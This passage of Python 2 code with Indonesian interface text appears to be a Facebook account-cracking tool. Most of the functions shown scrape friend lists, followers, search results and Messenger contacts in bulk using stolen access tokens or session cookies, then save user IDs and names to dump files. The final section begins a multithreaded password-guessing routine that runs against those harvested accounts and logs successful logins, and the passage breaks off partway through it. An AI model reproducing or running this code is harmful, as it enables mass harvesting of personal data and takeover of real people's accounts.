            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File tersimpan di : %s "%(___file___))
            raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]");menu()
        except (KeyError):
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Dump gagal");exit()
        except (ConnectionError):
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Koneksi eror");exit()
# belom di pasang mls v:
def ___fir__():
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Ketik \033[0;33m'me' \033[0;00mjika ingin dump id pertemanan sendiri")
        idt = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Id publik : ")
        
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        firgantengg = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,jeeckxd))
        z = json.loads(r.text)
        for _x_ in z['friends']['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            firgantengg.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
#            print ('\r%s[%s+%s]%s Id Target %s =>%s %s ' % (B,J,B,P,M,H,str(len(id)))),
            print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id --> \033[0;36m%s "%(len(id))),
            sys.stdout.flush();jeda(0.0050)

        firgantengg.close()

        print("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File tersimpan di --> \033[0;36m%s "%(file))
        raw_input("\033[0;36m[\033[0;00m ENTER \033[0;36m]")
        menu()
    except Exception as e:
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Kemungkinan akun mati / id tersebut privat ");exit()

# sudah di pasang
def ___firmasal__():
	try:
		__token__=open('login.txt', 'r').read()
	except I0Error:
		fir88("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;31m Token modar dinggo wae");exit()
	try:
		print("\033[0;36m[\033[0;00m+\033[0;36m]\x1b[1;92m Limit Id sewajarnya tod")
		__total = int(raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mau dump berapa id\x1b[1;92m : "))
	except:
		__total = 1
	__file = raw_input("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Buat file\x1b[1;92m : ")
	for zx in range(__total):
		zx += 1
		__ids=raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User \x1b[1;92m%s : "%(zx))
		try:
			rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
			ex=json.loads(rex.text)
			file = open(__file , 'a')
			id = []
			for a in ex['friends']['data']:
				id.append(a['id']+"<<fir>>"+a['name'])
				file.write(a['id']+"<<fir>>"+a['name']+'\n')
				print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id  %s "%(len(id))),
#				print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
		except KeyError:
			fir88("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mungkin id tersebut privat / akun tumbal mati");exit()
	file.close()
	__id=open(__file, 'r').readlines()
	print("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Total id : %s "%(len(__id)))
	print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File dump di simpan di \x1b[1;92m: %s "%(__file))
	raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]");menu()


# Dump Very Old
def ___palingtua__():
    try:
        fir88xd = open('data/token.txt','r').read()
    except (IOError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;33m Token modar dinggo wae");exit()
    try:
        ___ids___ = raw_input("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User id : ")
        if ___ids___ in ['',' ']:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Jangan kosong ");exit()
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,jeeckxd)).json()
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Nama : %s "%(oxo['name']))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User tidak di temukan");exit()
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,jeeckxd)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id •> \033[0;36m%s "%(len(id))),
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Total id : %s "%(len(___user___)))
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File tersimpan di : %s "%(___file___))
        raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]");menu()
    except (KeyError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Dump gagal");exit()
    except (ConnectionError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Koneksi eror");exit()
# nama
def ___nama7__():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Masukan cookie ya bro agar berjalan ")
            cookie = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Cookie : ")
            cvds = cvd(cookie)
            new = True
        except:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Login gagal ");dumpfl()
    else:
        cvds = cvd(open('data/cookies').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if kueh(cvds) != True:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Gagal njenk ");exit()
        
        if new == True:
            open('data/cookies', 'w').write(cookie)
        sim=raw_input("\n%s[%s+%s] %sName File %s--> %s "%(B,P,B,P,M,K)).replace(" ","_")
#        sim=raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Nama file %s: %s "%(B)).replace(" ","_")
#        print ("%s[%s+%s] %sExample Name %s[ %sAisyah Chans %s]"%(B,J,B,P,M,H,M))
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Contoh nama untuk di masukan [ Firman Syah ]")
        s=raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Nama : ")
        if s in("xnano","Xnano","XNANO","Xnano Jeeck","Xnano jeeck","XNANO JEECK","xnano jeeck"):
        	print("\n%s[%s+%s] %sanak anjing mau crack pake nama gw "%(B,P,B,P));exit()
        elif s in("Xnano Jeeck","Xnano jeeck","XNANO JEECK","xnano jeeck"):
        	print ("\n%s[%s+%s] %sJeeck X Nano Xx Brutall"%(B,J,B,P));exit()
        namah(sim,cvds,"https://mbasic.facebook.com/search/people/?q="+s)
    else:
        try:
            os.remove('data/cookies')
        except:
            pass
        fir88("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Login eror ")
        dumpfl()
    return
def namah(sim,r,b):
	open(sim,"a+")
	b=bs4.BeautifulSoup(requests.get(b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		
		print("\r%s[%s+%s] %s Pengumpulan id %s--> %s%s "%(B,P,B,P,P,K,str(len(open(sim).read().splitlines())))),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
		if "Lihat Hasil Selanjutnya" in i.text:
			namah(sim,r,i["href"])
	print ('\n\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Berhasil mengambil id dari nama ');print ('%s[%s+%s]%s File di simpan di %s-->%s %s '%(B,p,B,P,M,H,sim));raw_input('\n%s[%s+%s] [%s Enter%s ] '%(B,P,B,U,O));menu()

class pesan:

    def __init__(self, cookies):
        self.cookies = cookies
        
        self.f = raw_input('\n%s[%s+%s] Nama file %s --> \033[0;36m%s '%(B,P,B,M,K)).replace(' ', '_')
        if self.f == '':
            pesan(cookies)
        open(self.f, 'w').close()
        self.dump('https://mbasic.facebook.com/messages')
    def dump(self,url):
    	open(self.f, 'a+')
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
#        print ("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(B,til,P,M,H,str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id •> \033[0;36m%s "%(str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                except Exception as e:
                    continue
            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://mbasic.facebook.com/' + i.get('href'))
#        print ('\n%s%s Succes dump id pesan mesengger '%(H,til))
#        print ('%s%s%s File dump tersimpan %s=>%s %s '%(B,til,P,M,H,self.f))
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File tersimpan di --> \033[0;36m%s "%(self.f))
        raw_input("\n\n\n\n\033[0;36m[\033[0;00m ENTER \033[0;36m]");menu()

# Masal Acak
def ___masal___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Jumlah ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Nama File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Masal Old
def ___masal2___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Jumlah ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Nama File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:10] in ['1000000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:9] in ['100000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:8] in ['10000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Masal new
def ___masal3___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Jumlah ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Nama File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if a['id'][:5] in ['10005','10006','10007','10008']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Very Old
def ___very___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("[!] Jangan Kosong")
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name']))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Follower Old
def ___follower___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name']))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005','1000006','1000007','1000008','1000009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:6] in ['100001','100002','100003','100004','100005','100006','100007','100008','100009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Follower New
def ___follower2___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Publik Acak
def ___acak___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            file.write(a['id']+"<=>"+a['name']+'\n')
            print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Publik Old
def ___old___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005','1000006','1000007','1000008','1000009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:6] in ['100001','100002','100003','100004','100005','100006','100007','100008','100009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))

# MULAI CRACK 
#class ngentod:

 #   def ___firmulai__():
#        firmulai.id = []
def ___firmu__():
        try:
            self.apk = raw_input('\n%s%s%s file dump %s> %s'%(U,til,O,M,K))
            self.id = open(self.apk).read().splitlines()
            print '%s%s%s jumlah Id%s > %s%s' %(U,til,O,M,H,len(self.id))
        except:
            print ('\n%s%s file dump : %s%s%s tidak ada'%(M,til,K,self.apk,M));jeda(2);print('%s%s lu harus dump id dlu, pilih antara menu no 1-6 '%(M,til));jeda(3);menu()
        rom = raw_input('%s%s%s gunakan password manual? y/t%s > %s'%(U,til,O,M,K))
        if rom in ('Y', 'y'):
            print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
            while True:
                pwek = raw_input('%s%s%s password %s> %s'%(U,til,O,M,K))
                if pwek == '':
                    print("%s%s Jangan kosong"%(M,til))
                elif len(pwek)<=5:
                    print ('%s%s sandi minimal 6 karakter'%(M,til))
                else:
                    def xxh(xxnx=None):
                        skm = raw_input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
                        if skm in(""):
                            print '%s%s isi yg benar sayang'%(M,til);self.xxh()
                        elif skm in("1","01"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.api, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("2","02"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mbasic, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("3","03"):
